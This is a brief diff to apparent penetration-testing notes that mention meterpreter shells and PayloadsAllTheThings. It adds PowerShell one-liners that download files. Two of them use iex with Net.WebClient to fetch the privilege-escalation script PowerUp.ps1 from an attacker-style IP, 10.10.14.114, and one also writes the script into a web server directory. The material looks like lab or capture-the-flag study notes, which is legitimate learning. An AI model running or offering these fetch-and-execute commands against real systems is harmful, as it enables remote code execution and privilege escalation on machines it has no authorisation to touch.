@@ -44,3 +44,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 Shell command in meterpreter to give the shell
 Then python to give python shell or Shell=...
 ---------------------------------
+(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+iex (New-Object Net.WebClient).DownloadString(‘http://10.10.14.114/PowerUp.ps1’)
+iex (New-Object Net.WebClient).DownloadFile('http://10.10.14.114:3333/PowerUp.ps1','C:\inetpub\wwwroot\Media\1035\PowerUp.ps1')
+---------------------------------------
